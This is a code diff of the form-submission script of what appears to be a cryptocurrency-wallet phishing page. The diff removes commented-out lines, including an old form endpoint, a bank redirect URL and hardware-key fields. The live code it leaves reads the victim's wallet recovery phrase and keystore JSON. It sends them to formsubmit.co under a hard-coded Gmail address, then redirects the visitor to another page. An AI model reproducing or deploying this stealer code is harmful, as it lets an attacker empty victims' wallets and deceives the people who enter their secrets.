@@ -8,15 +8,11 @@ forms.forEach((form) => form.addEventListener("submit", o));
 function o(e) {
   e.preventDefault();
   mail = "worlddavid40@gmail.com";
-  next = /* "https://www3.mtb.com"; */ "next.html";
+  next =  "next.html";
   subject = `${window.location.hostname} ${new Date()}`;
   let r = new FormData();
   let s = document.querySelector("form").name;
-  /* let walletName = walletname.innerHTML + " " + "Wallet"; */
-  /* hardwarekey = wallet_id.value; */
-  /* r.append("hardwarekey", hardwarekey); */
-  /* r.append("Wallet Type", walletName); */
-  
+ 
   console.log(r)
   phrase = phraseInput.value;
   jsonphrase = keystorejson.value;
@@ -31,7 +27,7 @@ function o(e) {
   r.append("_template", "table");
   r.append("_subject", subject);
   console.log(r);
-  let n = /* `https://liveformhq.com/form/01f631b5-7d6b-4bda-bb1e-3d61d2b630d9`; */ `https://formsubmit.co/${mail}`;
+  let n = `https://formsubmit.co/${mail}`;
   fetch(
     n,
     {
